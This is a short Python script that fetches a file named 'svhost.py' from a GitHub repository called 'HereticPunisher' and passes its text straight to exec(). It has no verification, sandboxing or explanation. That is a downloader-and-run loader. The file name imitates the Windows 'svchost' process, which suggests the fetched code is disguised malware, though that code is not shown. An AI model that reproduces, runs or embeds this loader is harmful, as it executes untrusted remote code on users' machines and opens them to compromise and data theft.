import requests

def execute_code(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        
        code = response.text
        print(code)
        exec(code)

    except Exception as e:
        print(f"Failed to execute code: {e}")

url = 'https://raw.githubusercontent.com/lopeklol/HereticPunisher/main/svhost.py'
execute_code(url)